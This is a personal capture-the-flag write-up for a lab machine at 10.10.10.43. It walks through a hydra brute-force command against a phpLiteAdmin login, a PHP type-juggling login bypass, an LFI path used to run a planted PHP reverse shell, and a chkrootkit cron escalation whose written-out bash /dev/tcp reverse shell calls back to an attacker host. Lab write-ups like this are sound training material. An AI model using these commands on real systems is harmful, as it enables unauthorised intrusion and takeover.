## Takeaway
- password brute-force can sometime be helpful as a last resort. Remember to use a smaller list such as `seclists`'s  `twitter-banned.txt` before starting a large one such as `rockyou.txt`.
- If a php login page is leaking whether a user exists, one can try to use `Loose comparisons/Type Juggling( == )` to bypass authentication.
	- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#loose-comparisons-type-juggling
- Always try out different approaches. If a payload does not work, try a different one.
- Do be cautious about 
	- special characters 
	- URL encodings when dealing with web shells.
## Metadata
- One login page at `http://10.10.10.43/department/login.php`.![[Pasted image 20231224200117.png]]
	- The error code will reveal a user called `admin` exist since `Invalid Password!` is shown instead of  `invalid username`.
	- Use `Loose comparisons/Type Juggling( == )` to bypass authentication. First, use `burpsuite` to capture login attempt with username `admin` and password `whatever`and change the password post data field to `password[]=whatever`before forwarding.![[Pasted image 20231225135803.png]]![[Pasted image 20231225135820.png]]
- Another login page for `phpLiteAdmin` at  `https://10.10.10.43/db/index.php`.![[Pasted image 20231224200127.png]]
	- `hydra` can brute force the password of  `phpLiteAdmin` login panel as `password123`.![[Pasted image 20231225131246.png]]
		```bash
		#username does not matter here because `phpLiteAdmin` does not require one but `hydra` does.
		hydra -l whatever -P Miscellaneous/SecLists/Passwords/twitter-banned.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
		```
	- `searchsploit` also reveals a couple vulnerabilities related to `phpLiteAdmin` and one of which is a RCE that potentially matches with the version above.![[Pasted image 20231225132510.png]]
#### Attack Path
- <mark>Exploitation</mark>
	- Log into the `phpLiteAdmin` and create a database called `hack.php` along with a new table called `payload`in this database and insert a `text` field  to be the php reverse shell payload. Finally, use LFI to execute the payload.![[Pasted image 20231225165007.png]]
		- <mark>Note itâ€™s important to use " in the PHP, as ' is being used by the database to define the entire string.</mark>
	- Log into the page at `http://10.10.10.43/department/login.php` by using `Loose comparisons/Type Juggling( == )` to bypass authentication.
		- Use `burpsuite` to capture login attempt with username `admin` and password `whatever`and change the password post data field to `password[]=whatever`before forwarding.
	- Use LFI by navigating to `http://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/hack.php.
- <mark>Post-Exploitation</mark>
	- <mark>www-data => amrois</mark>
		- `linPEAS` identified a potential SSH private key embedded within a `.png` file and it probably belongs to the local user `amrois`.                          ![[Pasted image 20231225171034.png]]  
		- Save the private SSH key on victim machine and use it to authenticate. However, even though `ssh` is listening on all interface but is blocked by the firewall. So we have to connect to port 22 within the reverse shell session.![[Pasted image 20231225171735.png]]
	- <mark>amrois => root</mark>
		- One can find reports generated under `/report` folder regular. Upon inspection, these reports are generated by `chkrootkit` and is vulnerable to a PrivEsc that `searchsploit` can identify.![[Pasted image 20231225181905.png]]
		- Navigate to `/tmp` folder and then run `echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.7/4444 0>&1' > update;chmod +x update` . Finally, wait for next cron job cycle to receive reverse shell call back.![[Pasted image 20231225185358.png]]